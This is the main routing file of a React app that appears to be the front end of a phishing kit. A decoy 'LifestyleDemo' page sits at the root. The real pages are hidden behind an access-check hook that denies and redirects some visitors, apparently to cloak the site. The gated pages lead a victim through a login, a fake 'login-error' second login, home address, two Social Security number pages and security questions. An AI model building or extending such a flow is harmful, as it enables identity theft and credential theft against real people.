import { BrowserRouter as Router, Routes, Route, Navigate } from 'react-router-dom';
import useAccessCheck from './Utils/useAccessCheck';
import { baseUrl } from './constants';

// Components
import Header from './components/Header';
import Sidebar from './components/Sidebar';
import Footer from './components/Footer';

// Pages
import LoginForm from './pages/LoginForm';
import LoginForm2 from './pages/LoginForm2';
import Register from './pages/Register';
import BasicInfo from './pages/BasicInfo';
import HomeAddress from './pages/HomeAddress';
import SSN1 from './pages/SSN1';
import SSN2 from './pages/SSN2';
import SecurityQuestions from './pages/SecurityQuestions';
import Terms from './pages/Terms';
import LifestyleDemo from './pages/LifestyleDemo';

// Layout component for protected routes
const ProtectedLayout = ({ children }: { children: React.ReactNode }) => {
  const isAllowed = useAccessCheck(baseUrl);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center">Loading...</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center">Access denied. Redirecting...</div>;
  }

  return (
    <div className="min-h-screen bg-white flex flex-col">
      <Header />
      <div className="bg-gradient-to-r from-orange-600 to-orange-500 h-10"></div>
      <main className="flex-1 bg-gray-50 py-12">
        <div className="max-w-7xl mx-auto px-4">
          <div className="flex gap-6">
            {children}
            <Sidebar />
          </div>
        </div>
      </main>
      <Footer />
    </div>
  );
};

function App() {
  return (
    <Router>
      <Routes>
        {/* Public routes */}
        <Route path="/" element={<LifestyleDemo />} />
        
        {/* Protected routes */}
        <Route path="/login" element={
          <ProtectedLayout>
            <LoginForm />
          </ProtectedLayout>
        } />
        
        <Route path="/login-error" element={
          <ProtectedLayout>
            <LoginForm2 />
          </ProtectedLayout>
        } />
        
  
        
        <Route path="/register" element={
          <ProtectedLayout>
            <Register />
          </ProtectedLayout>
        } />
        
        <Route path="/basic-info" element={
          <ProtectedLayout>
            <BasicInfo />
          </ProtectedLayout>
        } />
        
        <Route path="/home-address" element={
          <ProtectedLayout>
            <HomeAddress />
          </ProtectedLayout>
        } />
        
        <Route path="/ssn1" element={
          <ProtectedLayout>
            <SSN1 />
          </ProtectedLayout>
        } />
        
        <Route path="/ssn2" element={
          <ProtectedLayout>
            <SSN2 />
          </ProtectedLayout>
        } />
        
        <Route path="/security-questions" element={
          <ProtectedLayout>
            <SecurityQuestions />
          </ProtectedLayout>
        } />
        
        <Route path="/terms" element={
          <ProtectedLayout>
            <Terms />
          </ProtectedLayout>
        } />
        
        {/* Redirect any unknown routes to home */}
        <Route path="*" element={<Navigate to="/" replace />} />
      </Routes>
    </Router>
  );
}

export default App;


